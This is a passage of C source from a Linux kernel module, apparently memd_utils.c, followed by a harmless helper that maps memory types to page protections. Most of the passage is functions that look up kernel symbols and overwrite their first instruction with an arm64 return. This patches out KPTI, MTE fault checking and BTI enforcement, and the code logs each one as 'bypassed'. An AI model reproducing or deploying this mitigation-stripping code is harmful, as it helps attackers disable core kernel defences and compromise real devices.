    unsigned long fkpti_unmap;
    unsigned long fswapper_pg_dir;
    unsigned int *p;
    unsigned long v;

    fkpti_init = kallsyms_lookup_name_ex("kpti_init");
    if (fkpti_init) {
        p = (unsigned int *)fkpti_init;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed kpti_init\n");
        }
    }

    fkpti_enable = kallsyms_lookup_name_ex("kpti_enable");
    if (fkpti_enable) {
        p = (unsigned int *)fkpti_enable;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed kpti_enable\n");
        }
    }

    fkpti_disable = kallsyms_lookup_name_ex("kpti_disable");
    if (fkpti_disable) {
        p = (unsigned int *)fkpti_disable;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed kpti_disable\n");
        }
    }

    fkpti_isolate = kallsyms_lookup_name_ex("kpti_isolate_kernel");
    if (fkpti_isolate) {
        p = (unsigned int *)fkpti_isolate;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed kpti_isolate_kernel\n");
        }
    }

    fkpti_unmap = kallsyms_lookup_name_ex("kpti_unmap_user");
    if (fkpti_unmap) {
        p = (unsigned int *)fkpti_unmap;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed kpti_unmap_user\n");
        }
    }

    fswapper_pg_dir = kallsyms_lookup_name_ex("swapper_pg_dir");
    if (fswapper_pg_dir) {
        /* Observe-only site (never written): guarded read, and an
         * unreadable address simply skips the log. */
        v = 0;
        if (!memd_safe_read64((void *)fswapper_pg_dir, &v) && v == 0) {
            memd_info("cfi: swapper_pg_dir already zeroed\n");
        }
    }

    return ret;
}

static int cfi_bypass_mte(void)
 {
    int ret = 0;
    unsigned int RET = 0xD65F03C0;
    unsigned long fmted_check;
    unsigned long fmted_async;
    unsigned long fmted_tag;
    unsigned long fmted_exclude;
    unsigned int *p;

    fmted_check = kallsyms_lookup_name_ex("mte_check_sync_fault");
    if (fmted_check) {
        p = (unsigned int *)fmted_check;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed MTE sync fault check\n");
        }
    }

    fmted_async = kallsyms_lookup_name_ex("mte_check_async_fault");
    if (fmted_async) {
        p = (unsigned int *)fmted_async;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed MTE async fault check\n");
        }
    }

    fmted_tag = kallsyms_lookup_name_ex("mte_set_tag");
    if (fmted_tag) {
        p = (unsigned int *)fmted_tag;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed MTE set_tag\n");
        }
    }

    fmted_exclude = kallsyms_lookup_name_ex("mte_exclude_range");
    if (fmted_exclude) {
        p = (unsigned int *)fmted_exclude;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed MTE exclude_range\n");
        }
    }

    return ret;
}

static int cfi_bypass_bti(void)
 {
    int ret = 0;
    unsigned int RET = 0xD65F03C0;
    unsigned long fbti_el0;
    unsigned long fbti_pad;
    unsigned int *p;

    fbti_el0 = kallsyms_lookup_name_ex("bti_exception");
    if (fbti_el0) {
        p = (unsigned int *)fbti_el0;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed BTI exception\n");
        }
    }

    fbti_pad = kallsyms_lookup_name_ex("bti_pad_check");
    if (fbti_pad) {
        p = (unsigned int *)fbti_pad;
        if (cfi_need_patch32(p, RET) && !hook_write_range(p, &RET, INSTRUCTION_SIZE)) {
            ret++;
            memd_err("cfi: bypassed BTI pad check\n");
        }
    }

    return ret;
}

/**
 * convert_wmt_to_pgprot - Convert WMT memory type to pgprot_t
 * @wmt_type: WMT memory type constant (WMT_NORMAL, WMT_DEVICE_*, etc.)
 * @prot_out: Output pgprot_t value
 *
 * Return: 0 on success, negative error code on failure
 */
int convert_wmt_to_pgprot(int wmt_type, pgprot_t* prot_out) {
    if (!prot_out) {
        return -EINVAL;
    }
    switch (wmt_type) {
        case WMT_NORMAL:
            *prot_out = __pgprot(PROT_NORMAL);
            return 0;

        case WMT_NORMAL_TAGGED:
#if defined(PROT_NORMAL_TAGGED)
            *prot_out = __pgprot(PROT_NORMAL_TAGGED);
            return 0;
#else
            memd_warn("PROT_NORMAL_TAGGED not defined on this kernel\n");
            return -EINVAL;
#endif

        case WMT_NORMAL_NC:
#if defined(PROT_NORMAL_NC)
            *prot_out = __pgprot(PROT_NORMAL_NC);
            return 0;
#else
            memd_warn("PROT_NORMAL_NC not defined on this kernel\n");
            return -EINVAL;
#endif

        case WMT_NORMAL_WT:
#if defined(PROT_NORMAL_WT)
            *prot_out = __pgprot(PROT_NORMAL_WT);
            return 0;
#else
            memd_warn("PROT_NORMAL_WT not defined on this kernel\n");
            return -EINVAL;
#endif

        case WMT_DEVICE_nGnRnE:
#if defined(PROT_DEVICE_nGnRnE)
            *prot_out = __pgprot(PROT_DEVICE_nGnRnE);
            return 0;
#else
            memd_warn("PROT_DEVICE_nGnRnE not defined on this kernel\n");
            return -EINVAL;
#endif

        case WMT_DEVICE_nGnRE:
#if defined(PROT_DEVICE_nGnRE)
            *prot_out = __pgprot(PROT_DEVICE_nGnRE);
            return 0;
#else
            memd_warn("PROT_DEVICE_nGnRE not defined on this kernel\n");
            return -EINVAL;
#endif

        case WMT_DEVICE_GRE:
#if defined(PROT_DEVICE_GRE)
            *prot_out = __pgprot(PROT_DEVICE_GRE);
            return 0;
#else
            memd_warn("PROT_DEVICE_GRE not defined on this kernel\n");
            return -EINVAL;
#endif

        case WMT_NORMAL_iNC_oWB:
#if defined(PROT_NORMAL_iNC_oWB)
            *prot_out = __pgprot(PROT_NORMAL_iNC_oWB);
            return 0;
#else
            memd_warn("PROT_NORMAL_iNC_oWB not defined on this kernel\n");
            return -EINVAL;
#endif

        default:
            memd_warn("invalid prot: %d\n", wmt_type);
            return -EINVAL;
    }
}
/* kmod/memd/utils/memd_utils.c[∂] */
